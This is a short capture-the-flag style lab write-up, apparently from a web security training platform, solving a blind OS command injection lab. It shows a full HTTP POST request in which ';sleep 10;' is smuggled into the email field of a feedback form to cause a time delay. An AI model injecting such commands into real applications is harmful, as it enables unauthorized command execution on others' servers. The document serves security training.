# Blind OS command injection with time delays
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

## Решение
Последовательно подставляю `;sleep 10;` к каждому из параметров:
```
POST /feedback/submit HTTP/2
Host: 0a1b009603e4662080a554d5007b00e0.web-security-academy.net
Cookie: session=eCSKIKvkIptf445WfLi8wFTZBrNUZsTj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: https://0a1b009603e4662080a554d5007b00e0.web-security-academy.net
Referer: https://0a1b009603e4662080a554d5007b00e0.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=Hi1KCjopuQdYUVmLVjgC7BjXkjyQqCqW&name=test&email=test%40server.com;sleep 10;&subject=foo&message=bar
```
Параметр email оказался уязвимым к cmdi. Задание выполнено.
